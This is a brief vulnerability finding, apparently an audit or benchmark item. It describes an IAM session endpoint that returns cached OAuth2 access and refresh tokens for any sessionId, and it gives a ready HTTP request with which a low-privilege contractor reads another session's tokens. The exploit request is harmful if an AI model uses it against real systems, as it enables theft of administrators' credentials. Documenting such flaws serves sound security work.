diagnosis: The IAM session inspection endpoint queries the Redis-backed session repository using an arbitrary sessionId from the request path and returns cached downstream OAuth2 access and refresh tokens. An authenticated contractor or low-privilege user can steal active bearer credentials of system administrators and corporate directors by querying foreign session identifiers.
exploit_request:
GET /api/iam/sessions/b5514f77-3e11-47bb-a92c-91823a4b5c6d/token-store HTTP/1.1
Host: iam.enterprisecloud.net
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjb250cmFjdG9yXzAyIn0.token
Accept: application/json
